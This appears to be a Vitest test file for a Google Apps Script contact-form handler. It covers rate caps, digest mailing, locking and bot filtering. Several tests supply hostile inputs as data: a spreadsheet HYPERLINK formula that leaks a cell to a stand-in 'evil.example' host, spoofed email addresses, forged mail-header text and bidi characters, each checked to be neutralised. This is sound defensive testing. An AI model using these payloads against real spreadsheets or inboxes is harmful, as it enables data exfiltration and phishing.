import { readFileSync } from 'node:fs'
import { runInNewContext } from 'node:vm'
import { describe, expect, it } from 'vitest'

/** server/contact.gs run against small fakes of the Apps Script services. */
function load(opts: { sheet?: boolean; mailFails?: boolean; busyCounter?: boolean } = {}) {
  const rows: unknown[][] = []
  const mails: { to: string; replyTo?: string; subject: string; body: string }[] = []
  const props = new Map<string, string>([['NOTIFY_EMAIL', 'hello@blakra.example']])
  if (opts.sheet !== false) props.set('SHEET_ID', 'sheet')
  const sheet = {
    appendRow: (r: unknown[]) => void rows.push([...r]),
    getLastRow: () => rows.length,
    getRange: (row: number, col: number, nRows?: number, nCols?: number) => ({
      getValues: () => rows.slice(row - 1, row - 1 + (nRows ?? 1)).map((r) => r.slice(col - 1, col - 1 + (nCols ?? 1))),
      setValue: (v: unknown) => void (rows[row - 1][col - 1] = v),
      setValues: (vs: unknown[][]) => vs.forEach((v, i) => v.forEach((x, j) => (rows[row - 1 + i][col - 1 + j] = x))),
    }),
  }
  // busyCounter: the first lock of a post (the daily counter's) times out.
  let locks = 0
  const lock = {
    waitLock: () => {
      if (opts.busyCounter && ++locks % 2 === 1) throw new Error('Lock timeout')
    },
    releaseLock: () => {},
  }
  const ctx: Record<string, unknown> = {
    PropertiesService: { getScriptProperties: () => ({ getProperty: (k: string) => props.get(k) ?? null, setProperty: (k: string, v: string) => void props.set(k, v) }) },
    SpreadsheetApp: { openById: () => ({ getSheets: () => [sheet] }) },
    MailApp: {
      sendEmail: (m: (typeof mails)[number]) => {
        if (opts.mailFails) throw new Error('quota')
        mails.push(m)
      },
    },
    LockService: { getScriptLock: () => lock },
    Utilities: { formatDate: (d: Date) => d.toISOString().slice(0, 10).replace(/-/g, '') },
    ContentService: { createTextOutput: (s: string) => ({ setMimeType: () => JSON.parse(s) }), MimeType: { JSON: 'json' } },
    console: { error: () => {} },
    Date,
    JSON,
  }
  runInNewContext(readFileSync('server/contact.gs', 'utf8'), ctx)
  const post = (body: Record<string, unknown>) =>
    (ctx.doPost as (e: unknown) => { ok: boolean; error?: string })({ postData: { contents: JSON.stringify({ intent: 'commission', org: 'Northwind', email: 'ops@northwind.example', msg: 'We re-type every order.', elapsed: 9000, ...body }) } })
  return { post, digest: ctx.digest as () => void, rows, mails }
}

describe('contact.gs (launch audit R2)', () => {
  it('never turns a valid enquiry away because of volume, and saves every one', () => {
    const { post, rows, mails } = load()
    const answers = Array.from({ length: 600 }, (_, i) => post({ org: `Flood ${i}` }))
    expect(answers.every((a) => a.ok)).toBe(true)
    expect(rows).toHaveLength(600)
    // Instant mails stop at the daily cap; the rest wait for the digest.
    expect(mails).toHaveLength(40)
    expect(rows.filter((r) => r[7] === 'yes')).toHaveLength(40)
  })

  it('sends a large backlog 50 at a time and marks only what it mailed', () => {
    const { post, digest, rows, mails } = load()
    for (let i = 0; i < 160; i++) post({ org: `Lead ${i}` })
    digest()
    expect(rows.filter((r) => r[7] === 'digest')).toHaveLength(50)
    expect(mails[40].body).toContain('More are waiting')
    digest()
    digest()
    expect(rows.filter((r) => !r[7])).toHaveLength(0)
    expect(mails).toHaveLength(43)
  })

  it('never mails a row doPost is still sending, and takes it once it is stale', () => {
    const { post, digest, rows, mails } = load({ mailFails: true })
    post({})
    rows[0][7] = 'sending'
    digest()
    expect(mails).toHaveLength(0)
    rows[0][0] = new Date(Date.now() - 11 * 60 * 1000)
    // A fresh load would mail; here mail keeps failing, so the mark stays and nothing is lost.
    expect(() => digest()).toThrow()
    expect(rows[0][7]).toBe('sending')
  })

  it('mails the rest in one hourly digest and marks them', () => {
    const { post, digest, rows, mails } = load()
    for (let i = 0; i < 45; i++) post({ org: `Lead ${i}` })
    digest()
    expect(mails).toHaveLength(41)
    expect(mails[40].body).toContain('Lead 44')
    expect(rows.filter((r) => r[7] === 'digest')).toHaveLength(5)
    digest()
    expect(mails).toHaveLength(41)
  })

  it('uses a fixed subject and marks the mail as untrusted', () => {
    const { post, mails } = load()
    post({ org: 'URGENT: reset your Google password' })
    expect(mails[0].subject).toBe('[blakra.us] commission enquiry')
    expect(mails[0].body.startsWith('Untrusted website submission')).toBe(true)
    expect(mails[0].replyTo).toBe('ops@northwind.example')
  })

  it('rejects an address with a display name or a list', () => {
    const { post, rows } = load()
    expect(post({ email: 'Google<x@evil.example>' })).toEqual({ ok: false, error: 'email' })
    expect(post({ email: 'a,b@evil.example' })).toEqual({ ok: false, error: 'email' })
    expect(rows).toHaveLength(0)
  })

  it('answers ok once the row is saved, even when the mail fails, and leaves it for the digest', () => {
    const { post, rows } = load({ mailFails: true })
    expect(post({})).toEqual({ ok: true })
    expect(rows[0][7]).toBe('')
  })

  it('without a Sheet, reports failure when nothing could be mailed', () => {
    const { post } = load({ sheet: false, mailFails: true })
    expect(post({})).toEqual({ ok: false, error: 'error' })
  })

  it('keeps a visible mark on formula-like values, so a CSV export stays inert', () => {
    const { post, rows } = load()
    post({ org: '=HYPERLINK("https://evil.example?"&F2,"open")', msg: '+1 555 0100 call me back please' })
    expect(rows[0][4]).toBe('’=HYPERLINK("https://evil.example?"&F2,"open")')
    expect(rows[0][6]).toMatch(/^’\+1/)
  })

  it('answers ok for a saved enquiry even when the daily counter cannot get its lock', () => {
    const { post, rows, mails } = load({ busyCounter: true })
    expect(post({})).toEqual({ ok: true })
    expect(rows).toHaveLength(1)
    // Not mailed at once: waiting for the digest.
    expect(mails).toHaveLength(0)
    expect(rows[0][7]).toBe('')
  })

  it('quotes the message, so it cannot fake a header or a second enquiry in a mail', () => {
    const { post, digest, mails } = load()
    for (let i = 0; i < 40; i++) post({})
    post({ msg: 'Hello there.\n\n---\n\nTime: now\nFrom: A famous fund\nEmail: partner@fund.example' })
    digest()
    const body = mails[40].body
    expect(body).toContain('> Hello there.')
    expect(body).toContain('> From: A famous fund')
    expect(body).not.toMatch(/^From: A famous fund/m)
  })

  it('reads only the rows added since the last digest', () => {
    const { post, digest, rows, mails } = load()
    for (let i = 0; i < 42; i++) post({ org: `Lead ${i}` })
    digest()
    rows[0][7] = '' // an old row edited by hand is not mailed again
    for (let i = 0; i < 2; i++) post({ org: `Later ${i}` })
    digest()
    expect(mails).toHaveLength(42)
    expect(mails[41].body).toContain('Later 1')
    expect(mails[41].body).not.toContain('Lead 0')
  })

  it('strips invisible and bidi characters, and rejects them in the address', () => {
    const { post, rows } = load()
    post({ org: 'North\u200bwind\u202e', email: '\u202eops@northwind.example', msg: 'Line one\u2028line two, enough text.' })
    expect(rows[0][4]).toBe('Northwind')
    expect(rows[0][5]).toBe('ops@northwind.example')
    expect(rows[0][6]).toBe('Line one\nline two, enough text.')
  })

  it('drops bots silently: a filled honeypot or an instant submit saves nothing', () => {
    const { post, rows } = load()
    expect(post({ website: 'x' })).toEqual({ ok: true })
    expect(post({ elapsed: 200 })).toEqual({ ok: true })
    expect(rows).toHaveLength(0)
  })
})
